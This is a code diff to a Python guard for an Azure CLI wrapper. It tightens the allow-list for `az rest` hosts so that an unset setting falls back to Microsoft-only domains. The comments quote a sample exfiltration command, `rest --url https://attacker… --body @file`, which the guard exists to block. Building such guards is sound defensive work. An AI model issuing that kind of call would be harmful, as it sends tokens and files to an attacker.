@@ -56,10 +56,10 @@ DENY_CMDS = [x.strip() for x in os.environ.get("AZOBO_DENY_COMMANDS", "").split(
 # first-party service it's audienced to — there is NO legitimate reason for `az rest`
 # to target a non-Microsoft host, so anything else is exfiltration. We restrict the
 # --url/--uri host to these domain suffixes; this keeps raw Graph/ARM working while
-# killing `rest --url https://attacker… --body @file` token/file exfil. Empty = no
-# restriction. (Residual: an attacker controlling an Azure resource — e.g. their own
-# *.blob.core.windows.net — is bounded/traceable; use an egress proxy allow-list to
-# close even that.)
+# killing `rest --url https://attacker… --body @file` token/file exfil. Blank/unset
+# falls back to the default below; set "*" to deliberately disable. (Residual: an
+# attacker controlling an Azure resource — e.g. their own *.blob.core.windows.net —
+# is bounded/traceable; use an egress proxy allow-list to close even that.)
 # Commercial Azure/Microsoft only by default. Sovereign-cloud operators (US Gov,
 # China, etc.) add their own suffixes via AZOBO_REST_ALLOWED_DOMAINS.
 _DEFAULT_REST_DOMAINS = ("microsoft.com,microsoftonline.com,windows.net,"
@@ -89,7 +89,8 @@ def _scrub(cmd):
 
 def _rest_host_ok(argv):
     """For `rest`/`invoke`: extract the --url/--uri host and check it against the
-    Microsoft/Azure allow-list. Returns (ok, host). No allow-list configured → ok."""
+    Microsoft/Azure allow-list. Returns (ok, host). ok when the guard is explicitly
+    disabled (AZOBO_REST_ALLOWED_DOMAINS="*" → REST_ALLOWED empty)."""
     if not REST_ALLOWED:
         return True, ""
     url = None
